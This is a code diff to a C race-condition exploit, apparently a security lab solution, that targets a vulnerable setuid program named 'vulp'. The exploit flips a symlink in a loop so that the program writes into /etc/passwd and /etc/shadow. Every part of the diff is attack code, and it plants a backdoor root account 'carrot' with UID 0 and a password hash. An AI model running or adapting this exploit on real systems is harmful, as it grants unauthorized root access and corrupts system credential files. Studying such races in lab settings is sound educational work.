@@ -17,18 +17,21 @@ void race ( char *filename, char *command ) {
 
 	while ( 1 ) {
 
+		/* Prepare link */
+		unlink( LINK );
+		symlink( DUMMY, LINK );
+
 		if( fork() == 0 ) {
 			system( command );
 			exit( EXIT_SUCCESS );
 		}
 
-		/* Race-condition */
-		unlink( LINK );
-		symlink( filename, LINK );
+		/* Wait for program */
+		/* usleep( 1 ); */
 
 		/* Race-condition */
 		unlink( LINK );
-		symlink( DUMMY, LINK );
+		symlink( filename, LINK );
 
 		/* Print records */
 		stat( filename, &st );
@@ -38,9 +41,7 @@ void race ( char *filename, char *command ) {
 			return;
 		}
 
-		printf("\33[2K\r");
-		printf("Attempt: %d", counter++);
-		/* system("sleep 0.001"); */
+		printf("\rAttempt: %d\r", counter++);
 
 	}
 
@@ -48,8 +49,17 @@ void race ( char *filename, char *command ) {
 
 int main ( int argc, char** argv ) {
 
-	race( "/etc/passwd", "echo \"carrot:x:0:0:carrot:/root:/bin/bash\" | ./vulp > /dev/null" );
-	race( "/etc/shadow", "echo \"carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::\" | ./vulp > /dev/null" );
+	unlink( "/tmp/race_passwd" );
+	unlink( "/tmp/race_shadow" );
+	FILE *passwd_file = fopen( "/tmp/race_passwd", "w" ),
+             *shadow_file = fopen( "/tmp/race_shadow", "w" );
+	fprintf(passwd_file, "carrot:x:0:0:carrot:/root:/bin/bash");
+	fprintf(shadow_file, "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::");
+	fclose(passwd_file);
+	fclose(shadow_file);
+
+	race( "/etc/passwd", "./vulp < /tmp/race_passwd > /dev/null" );
+	race( "/etc/shadow", "./vulp < /tmp/race_shadow > /dev/null" );
 
 	/* End process successfully */
 	exit( EXIT_SUCCESS );
